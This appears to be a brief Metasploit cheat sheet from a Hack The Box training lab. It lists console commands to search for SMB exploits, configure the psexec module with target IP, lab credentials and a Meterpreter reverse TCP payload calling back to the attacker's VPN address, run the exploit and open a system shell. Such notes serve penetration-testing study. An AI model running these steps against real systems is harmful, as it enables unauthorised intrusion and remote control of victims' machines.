# Metasploit Basics
```table-of-contents
```
## Starting Metasploit
```shell
sudo msfconsole -q
```
## Module Search & Selection
```shell
# Search for SMB exploits
msf6 > search smb

# Select a module by Number
msf6 > use 56
# OR by Name
msf6 > use exploit/windows/smb/psexec
```
## Configuration (Options)
```shell
# View available options
msf6 > options

# Set Target IP
msf6 > set RHOSTS 10.129.180.71

# Set Payload (If not default)
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp

# Set Attacker IP (LHOST) - Your VPN IP
msf6 > set LHOST tun0
# OR specific IP
msf6 > set LHOST 10.10.14.222

# Set Credentials (for PsExec)
msf6 > set SMBUser htb-student
msf6 > set SMBPass Password123
```
## Exploitation
```shell
# Run the exploit
msf6 > exploit
# OR run in background
msf6 > run -j
```
## Interacting with Sessions
```shell
# List active sessions
msf6 > sessions

# Interact with Session 1
msf6 > sessions -i 1

# Drop into a system shell from Meterpreter
meterpreter > shell
```